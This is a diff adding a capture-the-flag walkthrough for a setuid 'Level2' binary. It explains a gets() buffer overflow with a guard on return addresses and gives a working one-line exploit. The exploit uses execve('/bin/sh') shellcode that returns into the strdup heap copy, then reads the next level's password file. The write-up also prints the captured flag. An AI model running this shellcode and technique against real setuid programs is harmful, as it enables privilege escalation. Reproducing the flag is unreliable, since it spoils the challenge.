@@ -1,0 +1,54 @@
+# Level2 Walkthrough
+
+Binary is setuid `level3`. `main` only calls `p`:
+
+```c
+void p(void) {
+  char buffer[76];
+  void *ret;
+
+  fflush(stdout);
+  gets(buffer);
+  ret = __builtin_return_address(0);
+  if (((unsigned int)ret & 0xb0000000) == 0xb0000000) {
+    printf("(%p)\n", ret);
+    _exit(1);
+  }
+  puts(buffer);
+  strdup(buffer);
+}
+```
+
+## Vulnerability
+
+`gets(buffer)` has no bounds check -> buffer overflow, the saved return address of
+`p` can be overwritten. A guard blocks any return address starting with `0xb`
+(stack / libc / ld.so), so returning into the stack is impossible.
+
+But `strdup(buffer)` copies the input to the heap at a fixed `0x08...` address,
+which passes the guard and is executable.
+
+## Exploitation
+
+Buffer overflow: shellcode + padding + saved ebp + return address, where the
+return address points to the heap copy made by `strdup`.
+
+```sh
+(python -c 's="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"; print s + "A"*(80-len(s)) + "\x08\xa0\x04\x08"'; cat) | ./level2
+```
+
+- shellcode: `execve("/bin/sh")`, placed at the start so `strdup` copies it to the heap.
+- `"A"*(80-len(s))`: padding = offset 80 minus shellcode size, to reach the return address (buffer 76 + ebp 4).
+- `\x08\xa0\x04\x08`: heap address `0x804a008` (from `strdup`) in little-endian, overwrites the return address.
+- `; cat`: keeps stdin open so the shell stays usable.
+
+```sh
+whoami            # level3
+cat /home/user/level3/.pass
+```
+
+Flag:
+
+```txt
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
